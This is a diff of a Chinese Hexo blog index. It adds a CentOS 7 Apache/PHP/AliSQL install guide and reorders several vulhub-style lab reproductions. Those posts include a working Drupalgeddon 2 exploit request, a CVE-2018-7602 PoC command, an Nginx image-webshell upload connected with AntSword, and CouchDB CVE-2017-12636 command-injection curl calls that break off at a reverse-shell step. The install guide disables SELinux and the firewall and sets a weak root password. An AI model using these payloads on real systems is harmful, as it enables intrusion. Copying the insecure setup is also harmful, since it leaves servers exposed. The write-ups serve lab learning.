@@ -229,7 +229,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/doaker/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/Apache/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -248,7 +248,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/29/doaker/" itemprop="url">Centos 7 安装docker</a></h1>
+                <a class="post-title-link" href="/2019/07/30/Apache/" itemprop="url">CentOS 7下安装Apache</a></h1>
         
 
         <div class="post-meta">
@@ -260,8 +260,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-29T09:16:18+08:00">
-                2019-07-29
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-30T09:16:18+08:00">
+                2019-07-30
               </time>
             
 
@@ -301,7 +301,33 @@
         
           
             <hr>
-<h1 id="Centos-7-安装docker"><a href="#Centos-7-安装docker" class="headerlink" title="Centos 7 安装docker"></a>Centos 7 安装docker</h1><p>Docker介绍<br>Docker 是一个开放源代码软件项目，让应用程序布署在软件货柜下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker 利用 Linux 核心中的资源分离机制，例如 cgroups，以及 Linux 核心名字空间，来创建独立的容器。 –维基百科<br>&emsp;<br>安装Docker<br>移除旧版本的 Docker<br>yum remove docker <br>  docker-client <br>  docker-client-latest <br>  docker-common <br>  docker-latest <br>  docker-latest-logrotate <br>  docker-logrotate <br>  docker-selinux <br>  docker-engine-selinux <br>  docker-engine<br>&emsp;<br>创建 docker 组<br>groupadd docker<br>&emsp;<br>向 docker 组中添加您的用户<br>usermod -aG docker $USER<br>&emsp;<br>安装 Docker 依赖<br>yum install -y yum-utils device-mapper-persistent-data lvm2<br>&emsp;<br>添加源<br>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://download.docker.com/linux/centos/docker-ce.repo</a><br>&emsp;<br>更新 yum 缓存<br>yum makecache fast<br>&emsp;<br>安装 Docker-CE<br>yum install -y docker-ce<br>&emsp;<br>开启 Docker<br>systemctl start docker<br>&emsp;<br>安装 Docker Compose<br>curl -L “<a href="https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$" target="_blank" rel="noopener">https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$</a>(uname -s)-$(uname -m)” -o /usr/local/bin/docker-compose<br>&emsp;<br>chmod +x /usr/local/bin/docker-compose<br>&emsp;<br>开机自启动<br>systemctl enable docker<br>&emsp;<br>镜像加速器<br>vim /etc/docker/daemon.json<br>&emsp;<br>{<br>  “registry-mirrors”: [<br>    “<a href="https://docker.mirrors.ustc.edu.cn&quot;" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn&quot;</a><br>  ]<br>}<br>&emsp;<br>“registry-mirrors”: [“<a href="https://docker.mirrors.ustc.edu.cn&quot;]" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn&quot;]</a> #中科大<br>重新启动服务<br>systemctl daemon-reload<br>systemctl restart docker</p>
+<h1 id="CentOS-7下安装安装Apache"><a href="#CentOS-7下安装安装Apache" class="headerlink" title="CentOS 7下安装安装Apache"></a>CentOS 7下安装安装Apache</h1><p>• 关闭Selinux<br>vim /etc/selinux/config<br>SELINUX=disabled，将enabled改为disabled</p>
+<ol start="2">
+<li>安装必需组件<br>3 . 安装apr和apr-util<br>cd /usr/local/src<br>tar -zxvf apr-1.6.5.tar.gz<br>cd  apr-1.6.5/<br>./configure –prefix=/data/service/apr &amp;&amp; make &amp;&amp; make install<br>tar -zxvf apr-util-1.6.1.tar.gz<br>cd  apr-util-1.6.1/<br>./configure –prefix=/data/service/apr-util –with-apr=/data/service/apr &amp;&amp; make &amp;&amp; make install<br>4 . 安装zlib<br>tar -zxvf zlib-1.2.11.tar.gz<br>cd zlib-1.2.11/<br>./configure –prefix=/data/service/zlib &amp;&amp; make &amp;&amp; make install<br>5 . 安装pcre<br>tar -zxvf pcre-8.39.tar.gz<br>cd pcre-8.39/<br>./configure –prefix=/data/service/pcre &amp;&amp; make &amp;&amp; make install<br>5 . 更新openssl<br>tar -zxvf openssl-1.1.1b.tar.gz<br>cd openssl-1.1.1b /<br>./config –prefix=/data/service/openssl &amp;&amp; make &amp;&amp; make install<br>mv /usr/bin/openssl /usr/bin/openssl.old<br>ln -s /data/service/openssl/bin/openssl /usr/bin/openssl<br>ln -s /data/service/openssl/include/openssl  /usr/include/openssl<br>ln -s /data/service/openssl/lib/libssl.so /usr/local/lib64/libssl.so<br>6 . 安装Apache (httpd)<br>tar -zxvf httpd-2.4.39.tar.gz<br>cd httpd-2.4.39/<br>7 . 开启apache服务, 并自启动<br>vim /data/server/apache/conf/httpd.conf<br>修改 ServerName localhost:80<br>cp /data/server/apache/bin/apachectl /etc/rc.d/init.d/httpd<br>sed -i ‘1a # chkconfig: 35 85 21’ /etc/rc.d/init.d/httpd<br>sed -i ‘2a # description: apache 2.4.39’ /etc/rc.d/init.d/httpd<br>service httpd restart</li>
+<li>开启80端口<br>firewall-cmd –zone=public –add-port=80/tcp –permanent<br>• 安装AliSQL<br>• 安装并配置Java环境<br>• 安装cmake<br>tar -zxvf cmake-2.8.10.2.tar.gz<br>cd cmake-2.8.10.2<br>./bootstrap ; make ; make install<br>• 安装bison<br>tar -zxvf bison-2.7.tar.gz<br>cd bison-2.7<br>./configure<br>make -j 8 &amp;&amp; make install<br>• 安装AliSQL数据库<br>（1）卸载系统自带的Mariadb<br>rpm -qa|grep mariadb<br>rpm -e –nodeps mariadb-libs-5.5.60-1.el7_5.x86_64<br>（2）创建mysql用户组<br>groupadd mysql<br>（3）创建一个用户名为mysql的用户并加入mysql用户组<br>useradd -r -g mysql mysql<br>（4）将下载的压缩包放到/usr/local/src目录下并解压<br>unzip AliSQL-master.zip<br>（5）创建目录<br>mkdir -p /data/server/mysql<br>mkdir -p /data/server/AliSQL-data<br>（6）编译安装AliSQL<br> cd AliSQL-master/<br>make<br>make install<br>（7）修改AliSQL目录所有者和组<br>cd /data/server/AliSQL-data<br>chown -R mysql:mysql .<br>（8）初始化AliSQL数据库<br>cd /data/server/mysql/<br> scripts/mysql_install_db  –user=mysql  –datadir=/data/server/AliSQL-data<br>（9）复制AliSQL服务启动配置文件<br> cp /data/server/mysql/support-files/my-default.cnf /etc/my.cnf<br> cp support-files/mysql.server  /etc/init.d/mysqld<br> vim /etc/profile<br> 加入 PATH=/data/server/mysql/bin:/data/server/mysql/lib:$PATH<br> source /etc/profile<br>（10）启动AliSQL服务并加入开机自启动<br> service mysqld start<br> chkconfig –level 35 mysqld on<br>（11）配置数据库<br> mysql -u root -p<br>./bin/mysqladmin -u root password ‘1234abcd’<br>./bin/mysqladmin -u root -h data05 password ‘1234abcd’<br>（12）关闭防火墙<br>  systemctl stop firewalld<br>三、 安装PHP<br>• 解压PHP安装包<br>cd /usr/local/src<br>tar -zxvf php-7.1.29.tar.gz<br>• 以Apache的模块安装<br>cd php-7.1.29/<br>make &amp;&amp; make install<br>• 配置php.ini文件<br>cp /usr/local/src/php-7.1.29/php.ini-development /data/server/php7/etc/php.ini<br>• 关联PHP与Apache服务<br>• vim /data/server/apache/conf/httpd.conf<br>• 在LoadModule处添加LoadModule php7_module modules/libphp7.so<br>• 在DirectoryIndex后面添加：index.php<br>• 末尾添加&lt;FilesMatch .php$&gt;<pre><code>SetHandler application/x-httpd-php</code></pre>
+• 修改环境变量
+vim /etc/profile
+在末尾添加：PATH=$PATH:/data/server/php7/bin  
+export PATH
+完成！
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</li>
+</ol>
 
           
         
@@ -607,7 +633,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (14)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/doaker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -626,7 +652,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/28/ld (14)/" itemprop="url">Nginx 解析漏洞复现</a></h1>
+                <a class="post-title-link" href="/2019/07/29/doaker/" itemprop="url">Centos 7 安装docker</a></h1>
         
 
         <div class="post-meta">
@@ -638,8 +664,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T09:16:18+08:00">
-                2019-07-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-29T09:16:18+08:00">
+                2019-07-29
               </time>
             
 
@@ -679,7 +705,7 @@
         
           
             <hr>
-<h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>版本信息：<br>Nginx 1.x 最新版<br>PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。<br>直接执行docker-compose up -d启动容器，无需编译。<br>访问<a href="http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。" target="_blank" rel="noopener">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。</a><br><a href="https://imgchr.com/i/mEEl7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEl7V.png" alt="mEEl7V.png"></a><br>增加/.php后缀，被解析成PHP文件：<br><a href="https://imgchr.com/i/mEE8tU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEE8tU.png" alt="mEE8tU.png"></a><br>通过测试可以看出这就是传说中的nginx解析漏洞：在/nginx.png后加/.php会将nginx.png当成php解析<br>然后浏览器访问 <a href="http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy" target="_blank" rel="noopener">http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy</a> lq.jpg/b+shell.php/a zzz.jpg，生成并上传图片马：<br><a href="https://imgchr.com/i/mEEw0x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEw0x.png" alt="mEEw0x.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEWnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEWnI.png" alt="mEEWnI.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEo4S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEo4S.png" alt="mEEo4S.png"></a><br>现在通过浏览器访问，查看是否成功上传并解析：<br><a href="https://imgchr.com/i/mEEjH0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEjH0.png" alt="mEEjH0.png"></a><br>解析成功！<br>接下来通过蚁剑进行连接图片马，将图片马成功的解析路径作为蚁剑的连接路径：<br><a href="https://imgchr.com/i/mEVYUf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVYUf.png" alt="mEVYUf.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEVa8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVa8g.png" alt="mEVa8g.png"></a><br>成功！</p>
+<h1 id="Centos-7-安装docker"><a href="#Centos-7-安装docker" class="headerlink" title="Centos 7 安装docker"></a>Centos 7 安装docker</h1><p>Docker介绍<br>Docker 是一个开放源代码软件项目，让应用程序布署在软件货柜下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker 利用 Linux 核心中的资源分离机制，例如 cgroups，以及 Linux 核心名字空间，来创建独立的容器。 –维基百科<br>&emsp;<br>安装Docker<br>移除旧版本的 Docker<br>yum remove docker <br>  docker-client <br>  docker-client-latest <br>  docker-common <br>  docker-latest <br>  docker-latest-logrotate <br>  docker-logrotate <br>  docker-selinux <br>  docker-engine-selinux <br>  docker-engine<br>&emsp;<br>创建 docker 组<br>groupadd docker<br>&emsp;<br>向 docker 组中添加您的用户<br>usermod -aG docker $USER<br>&emsp;<br>安装 Docker 依赖<br>yum install -y yum-utils device-mapper-persistent-data lvm2<br>&emsp;<br>添加源<br>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://download.docker.com/linux/centos/docker-ce.repo</a><br>&emsp;<br>更新 yum 缓存<br>yum makecache fast<br>&emsp;<br>安装 Docker-CE<br>yum install -y docker-ce<br>&emsp;<br>开启 Docker<br>systemctl start docker<br>&emsp;<br>安装 Docker Compose<br>curl -L “<a href="https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$" target="_blank" rel="noopener">https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$</a>(uname -s)-$(uname -m)” -o /usr/local/bin/docker-compose<br>&emsp;<br>chmod +x /usr/local/bin/docker-compose<br>&emsp;<br>开机自启动<br>systemctl enable docker<br>&emsp;<br>镜像加速器<br>vim /etc/docker/daemon.json<br>&emsp;<br>{<br>  “registry-mirrors”: [<br>    “<a href="https://docker.mirrors.ustc.edu.cn&quot;" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn&quot;</a><br>  ]<br>}<br>&emsp;<br>“registry-mirrors”: [“<a href="https://docker.mirrors.ustc.edu.cn&quot;]" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn&quot;]</a> #中科大<br>重新启动服务<br>systemctl daemon-reload<br>systemctl restart docker</p>
 
           
         
@@ -849,7 +875,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (12)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (14)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -868,7 +894,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/27/ld (12)/" itemprop="url">Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）</a></h1>
+                <a class="post-title-link" href="/2019/07/28/ld (14)/" itemprop="url">Nginx 解析漏洞复现</a></h1>
         
 
         <div class="post-meta">
@@ -880,8 +906,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T09:16:18+08:00">
-                2019-07-27
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T09:16:18+08:00">
+                2019-07-28
               </time>
             
 
@@ -921,7 +947,7 @@
         
           
             <hr>
-<h1 id="Drupal-Drupalgeddon-2远程执行代码漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2远程执行代码漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）</h1><p>漏洞原理<br>Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞<br>&emsp;<br>7.58之前的Drupal，8.3.9之前的8.x，8.4.6之前的8.4.x和8.5.1之前的8.5.x允许远程攻击者执行任意代码，因为影响具有默认或通用模块配置的多个子系统的问题包括表单API。<br>&emsp;<br>环境启动后，访问<a href="http://your-ip:8080/，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。因为没有mysql环境，所以在安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。" target="_blank" rel="noopener">http://your-ip:8080/，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。因为没有mysql环境，所以在安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。</a><br>&emsp;<br>打开bp拦截  然后发送到重发器<br><a href="https://imgchr.com/i/mEkQvn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEkQvn.png" alt="mEkQvn.png"></a><br>参考a2u / CVE-2018-7600，我们可以向drupal发送以下请求<br>修改http请求<br>&emsp;<br>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 103<br>&emsp;<br>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id<br>emsp;<br>成功执行代码后，执行id命令：<br><a href="https://imgchr.com/i/mEkwvR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEkwvR.png" alt="mEkwvR.png"></a></p>
+<h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>版本信息：<br>Nginx 1.x 最新版<br>PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。<br>直接执行docker-compose up -d启动容器，无需编译。<br>访问<a href="http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。" target="_blank" rel="noopener">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。</a><br><a href="https://imgchr.com/i/mEEl7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEl7V.png" alt="mEEl7V.png"></a><br>增加/.php后缀，被解析成PHP文件：<br><a href="https://imgchr.com/i/mEE8tU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEE8tU.png" alt="mEE8tU.png"></a><br>通过测试可以看出这就是传说中的nginx解析漏洞：在/nginx.png后加/.php会将nginx.png当成php解析<br>然后浏览器访问 <a href="http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy" target="_blank" rel="noopener">http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy</a> lq.jpg/b+shell.php/a zzz.jpg，生成并上传图片马：<br><a href="https://imgchr.com/i/mEEw0x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEw0x.png" alt="mEEw0x.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEWnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEWnI.png" alt="mEEWnI.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEo4S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEo4S.png" alt="mEEo4S.png"></a><br>现在通过浏览器访问，查看是否成功上传并解析：<br><a href="https://imgchr.com/i/mEEjH0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEjH0.png" alt="mEEjH0.png"></a><br>解析成功！<br>接下来通过蚁剑进行连接图片马，将图片马成功的解析路径作为蚁剑的连接路径：<br><a href="https://imgchr.com/i/mEVYUf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVYUf.png" alt="mEVYUf.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEVa8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVa8g.png" alt="mEVa8g.png"></a><br>成功！</p>
 
           
         
@@ -1043,6 +1069,127 @@
           
             <hr>
 <h1 id="Drupal远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal远程代码执行漏洞（CVE-2018-7602）"></a>Drupal远程代码执行漏洞（CVE-2018-7602）</h1><p>影响软件：drupal<br>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤<br>效果：任意命令执行<br>环境启动后，访问 <a href="http://your-ip:8081/" target="_blank" rel="noopener">http://your-ip:8081/</a> 将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。<br>漏洞复现：<br>首先需要整到一个POC，参考网址：<a href="https://github.com/pimps/CVE-2018-" target="_blank" rel="noopener">https://github.com/pimps/CVE-2018-</a><br>7600/blob/master/drupa7-CVE-2018-7602.py。<br>执行如下命令，即可复现该漏洞。<br>python3 drupa7-CVE-2018-7602.py -c “id” admin 123456<br><a href="http://192.168.199.151:8081/" target="_blank" rel="noopener">http://192.168.199.151:8081/</a><br>admin为用户名；123456为密码；后面ip改为靶机ip；本次实例命令为’id’<br><a href="https://imgchr.com/i/mEAKIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEAKIO.png" alt="mEAKIO.png"></a><br>如上图所示id命令已经执行</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (12)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/27/ld (12)/" itemprop="url">Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T09:16:18+08:00">
+                2019-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Drupal-Drupalgeddon-2远程执行代码漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2远程执行代码漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）</h1><p>漏洞原理<br>Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞<br>&emsp;<br>7.58之前的Drupal，8.3.9之前的8.x，8.4.6之前的8.4.x和8.5.1之前的8.5.x允许远程攻击者执行任意代码，因为影响具有默认或通用模块配置的多个子系统的问题包括表单API。<br>&emsp;<br>环境启动后，访问<a href="http://your-ip:8080/，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。因为没有mysql环境，所以在安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。" target="_blank" rel="noopener">http://your-ip:8080/，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。因为没有mysql环境，所以在安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。</a><br>&emsp;<br>打开bp拦截  然后发送到重发器<br><a href="https://imgchr.com/i/mEkQvn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEkQvn.png" alt="mEkQvn.png"></a><br>参考a2u / CVE-2018-7600，我们可以向drupal发送以下请求<br>修改http请求<br>&emsp;<br>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 103<br>&emsp;<br>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id<br>emsp;<br>成功执行代码后，执行id命令：<br><a href="https://imgchr.com/i/mEkwvR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEkwvR.png" alt="mEkwvR.png"></a></p>
 
           
         
@@ -1320,129 +1467,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (7)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (7)/" itemprop="url">Couchdb 任意命令执行漏洞（CVE-2017-12636）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><p>漏洞原理<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>&emsp;<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br>复现漏洞<br>访问<a href="http://your-ip:5984/即可看到Couchdb的欢迎页面" target="_blank" rel="noopener">http://your-ip:5984/即可看到Couchdb的欢迎页面</a><br><a href="https://imgchr.com/i/mAwouR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwouR.png" alt="mAwouR.png"></a><br>&emsp;<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先【增加一个管理员用户】。这里上一个已经登录过了<br><a href="https://imgchr.com/i/mAwXCD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwXCD.png" alt="mAwXCD.png"></a><br>新增query_server配置，写入要执行的命令：<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘<br>“id &gt;/tmp/success”<br>&emsp;<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/zqd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/zqd&#39;</a><br>{“error”:”file_exists”,”reason”:”The database could not be created, the file already exists.”}<br>新建一个临时库和临时表，插入一条记录<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd&#39;</a><br>{“ok”:true}<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br>{“ok”:true,”id”:”vul”,”rev”:”1-967a00dff5e02add41819138abb3284d”}<br>调用query_server处理数据。<br>[root@localhost ~]# curl -X PUT <a href="http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”<br>{“ok”:true,”id”:”_design/vul”,”rev”:”1-ed713e4db9c7db605913fd62fb102ded”}<br>&emsp;<br>在kali上<br>执行EXP反弹Shell<br>根据上述发送的请求，可使用 python 编写EXP（实验文件exp.py）简化操作，修改EXP中的 target (目标机器地址)和 command 